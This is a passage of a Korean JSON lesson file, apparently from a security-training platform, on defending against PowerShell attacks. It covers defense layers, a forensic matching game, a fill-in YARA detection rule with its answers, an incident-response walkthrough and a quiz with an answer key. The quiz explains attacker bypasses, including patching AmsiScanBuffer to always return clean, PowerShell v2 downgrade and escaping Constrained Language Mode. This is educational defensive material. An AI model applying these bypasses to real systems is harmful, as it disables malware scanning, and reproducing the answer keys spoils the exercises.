+              "ascii": "  ┌──────────── 엔터프라이즈 방어 계층 ─────────────┐\n  │                                                  │\n  │  Layer 1: 예방 (Prevention)                       │\n  │  ┌──────────┬──────────┬──────────┬─────────┐   │\n  │  │   CLM    │  WDAC    │   JEA    │ PS v2.0 │   │\n  │  │ 언어제한 │ 앱 제어  │ 최소권한 │  제거   │   │\n  │  └──────────┴──────────┴──────────┴─────────┘   │\n  │                                                  │\n  │  Layer 2: 탐지 (Detection)                        │\n  │  ┌──────────┬──────────┬──────────┬─────────┐   │\n  │  │  AMSI    │ SBL 4104 │  Sigma   │  YARA   │   │\n  │  │ 실시간   │ 로깅     │  규칙    │  탐지   │   │\n  │  └──────────┴──────────┴──────────┴─────────┘   │\n  │                                                  │\n  │  Layer 3: 대응 (Response)                         │\n  │  ┌──────────┬──────────┬──────────┬─────────┐   │\n  │  │   SOAR   │  자동    │ 포렌식   │  위협   │   │\n  │  │ 플레이북 │  격리    │  수집    │ 인텔    │   │\n  │  └──────────┴──────────┴──────────┴─────────┘   │\n  └──────────────────────────────────────────────────┘"
+            },
+            {
+              "type": "info",
+              "heading": "방어 체크리스트 요약",
+              "content": "엔터프라이즈 환경에서 PowerShell 공격을 방어하기 위한 체크리스트: ✅ PowerShell v2.0 제거 (다운그레이드 공격 방지). ✅ Script Block Logging + Module Logging + Transcription 활성화. ✅ AMSI 활성 상태 확인 (안티맬웨어 솔루션 연동). ✅ CLM + AppLocker/WDAC 연동 (고급 기능 제한). ✅ JEA 구성 (원격 세션 최소 권한). ✅ Sigma/YARA 규칙 SIEM 배포. ✅ 비정상 부모 프로세스 모니터링 (wmiprvse.exe → powershell.exe 등)."
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "matching_game",
+          "title": "포렌식 아티팩트와 분석 위치 매칭",
+          "description": "각 포렌식 아티팩트가 발견되는 올바른 위치를 선택하세요.",
+          "pairs": [
+            { "left": "사용자가 입력한 PowerShell 명령 이력", "right": "ConsoleHost_history.txt" },
+            { "left": "powershell.exe 실행 시간과 참조 파일 목록", "right": "Prefetch (C:\\Windows\\Prefetch\\)" },
+            { "left": "난독화 해제된 실행 스크립트 전문", "right": "Event ID 4104 (Script Block Log)" },
+            { "left": "프로세스 생성 명령줄 인자", "right": "Event ID 4688 (Security Log)" },
+            { "left": "영구 WMI 이벤트 구독 (지속성)", "right": "WMI Repository (OBJECTS.DATA)" }
+          ]
+        },
+        {
+          "type": "code_fill",
+          "title": "인코딩된 PowerShell 탐지 YARA 규칙 완성",
+          "description": "인코딩된 PowerShell 명령을 탐지하는 YARA 규칙의 빈칸을 올바른 값으로 채우세요.",
+          "code": {
+            "filename": "yara_encoded_ps_fill.yar",
+            "language": "yara",
+            "lines": [
+              { "text": "rule Encoded_PowerShell_Execution {", "color": "cyan" },
+              { "text": "    strings:", "color": "yellow" },
+              { "text": "        $enc1 = \"___blank1___\" ascii wide nocase", "color": "orange" },
+              { "text": "        $enc2 = \"-enc \" ascii wide nocase", "color": "orange" },
+              { "text": "        $b64 = \"___blank2___\" ascii wide nocase", "color": "purple" },
+              { "text": "        $ps = \"___blank3___\" ascii wide nocase", "color": "purple" },
+              { "text": "", "color": "white" },
+              { "text": "    condition:", "color": "yellow" },
+              { "text": "        (1 of ($enc*)) and ($b64 or $ps)", "color": "red" },
+              { "text": "}", "color": "cyan" }
+            ]
+          },
+          "blanks": [
+            { "id": "blank1", "answer": "-EncodedCommand", "hint": "Base64 인코딩 명령 실행 옵션", "alternatives": ["-encodedcommand", "EncodedCommand"] },
+            { "id": "blank2", "answer": "FromBase64String", "hint": "Base64 디코딩 .NET 메서드", "alternatives": ["frombase64string"] },
+            { "id": "blank3", "answer": "powershell", "hint": "스크립팅 엔진 이름", "alternatives": ["powershell.exe", "pwsh"] }
+          ]
+        },
+        {
+          "type": "step_click",
+          "title": "PowerShell 공격 사고 대응 워크플로",
+          "description": "악성 PowerShell 활동이 탐지되었을 때의 사고 대응 과정을 단계별로 따라가 보세요.",
+          "steps": [
+            { "emoji": "🚨", "label": "알림 수신: 의심 PowerShell 활동 탐지", "detail": "SIEM에서 Sigma 규칙이 트리거됩니다. Event ID 4104에서 Reflection.Assembly::Load와 DownloadData 패턴이 동시에 감지되었습니다. 의심 호스트: WORKSTATION-05." },
+            { "emoji": "🔍", "label": "초기 분석: 스크립트 블록 로그 확인", "detail": "Event ID 4104의 ScriptBlockText를 확인합니다. Base64 디코딩 후 .NET 어셈블리를 메모리 로딩하는 코드가 확인됩니다. 외부 URL에서 바이너리를 다운로드하고 있습니다." },
+            { "emoji": "🔗", "label": "프로세스 체인 추적", "detail": "Event ID 4688과 Sysmon 로그로 프로세스 트리를 추적합니다. OUTLOOK.EXE → cmd.exe → powershell.exe 체인이 확인되어 피싱 이메일 기반 공격으로 판단합니다." },
+            { "emoji": "🌐", "label": "IoC 추출 및 네트워크 분석", "detail": "C2 서버 IP/도메인을 추출합니다. 방화벽 로그에서 해당 IP로의 통신 기록을 확인하고, 다른 시스템에서도 동일 IoC가 있는지 검색합니다." },
+            { "emoji": "🔒", "label": "억제: 시스템 격리 및 차단", "detail": "감염 시스템을 네트워크에서 격리합니다. C2 IP/도메인을 방화벽에서 차단합니다. 관련 사용자 계정의 자격증명을 리셋합니다." },
+            { "emoji": "🧹", "label": "제거: 악성 아티팩트 정리", "detail": "메모리의 악성 프로세스를 종료합니다. WMI 영구 구독, 예약 작업 등 지속성 메커니즘을 제거합니다. 레지스트리 변경을 복원합니다." },
+            { "emoji": "📋", "label": "복구 및 보고서 작성", "detail": "시스템을 안전한 상태로 복원합니다. 공격 타임라인, 영향 범위, 탈취된 데이터, 방어 개선 사항을 포함한 사고 보고서를 작성합니다." }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "AMSI(Antimalware Scan Interface)가 PowerShell 공격을 탐지할 수 있는 근본적 이유는?",
+            "options": [
+              "디스크의 .ps1 파일을 스캔하기 때문",
+              "PowerShell 엔진이 코드를 실행하기 전에 난독화 해제된 원본 코드를 AMSI에 전달하기 때문",
+              "네트워크 트래픽을 모니터링하기 때문",
+              "커널 드라이버로 동작하기 때문"
+            ],
+            "correct": 1,
+            "explanation": "AMSI는 PowerShell 엔진 내부에 통합되어, 스크립트가 실행되기 전에 난독화가 해제된 최종 코드를 안티맬웨어 솔루션에 전달합니다. Base64 디코딩, 문자열 연결 등이 모두 해제된 상태이므로 난독화를 우회할 수 없습니다."
+          },
+          {
+            "question": "AmsiScanBuffer 패치 우회의 핵심 원리는?",
+            "options": [
+              "AMSI 서비스를 중지시킴",
+              "amsi.dll 파일을 삭제함",
+              "AmsiScanBuffer 함수의 첫 바이트를 패치하여 항상 CLEAN 결과를 반환하도록 변조",
+              "Windows Defender를 비활성화함"
+            ],
+            "correct": 2,
+            "explanation": "공격자는 VirtualProtect()로 amsi.dll의 AmsiScanBuffer 함수 메모리를 쓰기 가능으로 변경한 후, 첫 바이트를 'xor eax,eax; ret'(0 반환)으로 패치합니다. 이로 인해 AMSI가 항상 AMSI_RESULT_CLEAN을 반환하여 모든 검사를 우회합니다."
+          },
+          {
+            "question": "PowerShell v2.0 다운그레이드 공격의 방어 방법은?",
+            "options": [
+              "실행 정책을 Restricted로 설정",
+              "PowerShell v2.0 엔진과 .NET Framework 2.0을 완전히 제거",
+              "AMSI를 업데이트",
+              "방화벽에서 PowerShell 차단"
+            ],
+            "correct": 1,
+            "explanation": "v2.0 다운그레이드는 AMSI, Script Block Logging, CLM 등 모든 최신 보안 기능을 우회합니다. Disable-WindowsOptionalFeature로 PowerShell v2.0 엔진과 .NET Framework 2.0을 완전히 제거하면 다운그레이드 자체가 불가능해집니다."
+          },
+          {
+            "question": "WMI를 통한 원격 PowerShell 실행에서 핵심 탐지 지표는?",
+            "options": [
+              "Event ID 4104에서 WMI 키워드 확인",
+              "부모 프로세스가 wmiprvse.exe이고 자식이 powershell.exe인 프로세스 트리",
+              "네트워크에서 HTTP 트래픽 확인",
+              "레지스트리 변경 이벤트"
+            ],
+            "correct": 1,
+            "explanation": "WMI를 통해 원격으로 프로세스를 생성하면, WMI Provider Host(wmiprvse.exe)가 부모 프로세스가 됩니다. Sysmon Event ID 1에서 ParentImage가 wmiprvse.exe이고 자식이 powershell.exe인 관계는 WMI 원격 실행의 강력한 탐지 지표입니다."
+          },
+          {
+            "question": "JEA(Just Enough Administration)가 PowerShell 보안에 기여하는 방식은?",
+            "options": [
+              "모든 PowerShell 실행을 차단",
+              "원격 세션에서 사용 가능한 Cmdlet을 역할 기반으로 최소한으로 제한",
+              "스크립트를 자동으로 암호화",
+              "AMSI를 강화"
+            ],
+            "correct": 1,
+            "explanation": "JEA는 PowerShell 원격 세션에서 허용된 Cmdlet만 실행 가능하도록 역할 기반 접근 제어를 구현합니다. 공격자가 세션을 탈취하더라도 제한된 명령만 사용할 수 있어 피해 범위를 최소화합니다."
+          },
+          {
+            "question": "ConsoleHost_history.txt 파일의 포렌식 가치는?",
+            "options": [
+              "실행된 스크립트 코드 전문이 기록됨",
+              "PowerShell 콘솔에서 입력된 명령 이력이 평문으로 저장됨",
+              "네트워크 연결 기록이 저장됨",
+              "시스템 이벤트 로그가 백업됨"
+            ],
+            "correct": 1,
+            "explanation": "PSReadLine 모듈은 PowerShell 콘솔에서 입력된 모든 명령을 ConsoleHost_history.txt에 평문으로 저장합니다. 공격자가 대화형 세션에서 입력한 명령이 그대로 남을 수 있어 포렌식에서 중요한 아티팩트입니다."
+          },
+          {
+            "question": "다음 YARA 규칙 조건의 의미는?\n(1 of ($dl*) and 1 of ($exec*)) or (1 of ($ref*) and 1 of ($dl*))",
+            "options": [
+              "다운로드 관련 문자열만 있으면 탐지",
+              "다운로드+실행 조합 또는 리플렉션+다운로드 조합이 있으면 탐지",
+              "모든 문자열이 동시에 존재해야 탐지",
+              "하나의 문자열만 있어도 탐지"
+            ],
+            "correct": 1,
+            "explanation": "이 조건은 두 가지 위협 패턴을 탐지합니다: (1) 다운로드 크레이들 — 다운로드($dl*)와 실행($exec*) 문자열이 함께 존재. (2) 리플렉션 로딩 — 리플렉션($ref*)과 다운로드($dl*) 문자열이 함께 존재. 각각 Fileless 공격의 전형적 패턴입니다."
+          },
+          {
+            "question": "Constrained Language Mode 우회를 위해 공격자가 C#으로 사용자 정의 Runspace를 생성하는 이유는?",
+            "options": [
+              "C# 코드가 더 빠르기 때문",
+              "C#에서 InitialSessionState.LanguageMode를 FullLanguage로 설정한 새 Runspace를 생성할 수 있기 때문",
+              "C#이 관리자 권한을 자동으로 부여하기 때문",
+              "C# 코드는 AMSI 검사를 받지 않기 때문"
+            ],
+            "correct": 1,
+            "explanation": "CLM은 현재 PowerShell 세션의 언어 모드를 제한하지만, C# 코드에서 System.Management.Automation API를 직접 호출하여 InitialSessionState.LanguageMode를 FullLanguage로 설정한 새 Runspace를 생성하면 CLM을 우회할 수 있습니다."
+          }
+        ]
+      }
+    }
+  },
+  "metadata": {
+    "ctiSources": [
+      { "name": "MITRE ATT&CK", "url": "https://attack.mitre.org/techniques/T1059/001/", "dataUsed": "T1059.001 기법 정의, Procedure Examples 및 탐지 방법", "description": "T1059.001 기법 정의, Procedure Examples 및 탐지 방법" },
+      { "name": "MITRE CTI GitHub", "url": "https://github.com/mitre/cti", "dataUsed": "STIX 2.1 JSON 데이터 — PowerShell 관련 탐지 방법 및 완화 전략", "description": "STIX 2.1 JSON 데이터 — PowerShell 관련 탐지 방법 및 완화 전략" },
+      { "name": "CISA Advisory", "url": "https://www.cisa.gov/", "dataUsed": "PowerShell 보안 강화 권고 및 로깅 설정 가이드라인", "description": "PowerShell 보안 강화 권고 및 로깅 설정 가이드라인" },
+      { "name": "Sigma Rules Repository", "url": "https://github.com/SigmaHQ/sigma", "dataUsed": "PowerShell 악용 탐지 Sigma 규칙 (Encoded Command, Download Cradle)", "description": "PowerShell 악용 탐지 Sigma 규칙 (Encoded Command, Download Cradle)" }
+    ],
+    "aptGroups": ["APT29", "FIN7", "Lazarus Group", "Turla", "APT28"],
+    "relatedTechniques": ["T1059.003", "T1059.005", "T1027", "T1140", "T1105", "T1047"],
+    "tags": ["powershell", "execution", "fileless", "obfuscation", "amsi", "download-cradle", "encoded-command", "sigma", "yara", "constrained-language-mode", "script-block-logging"],
+    "lastUpdated": "2026-03-03",
+    "author": "GOTROOT Education Team",
+    "version": "1.0.0"
+  }
+}
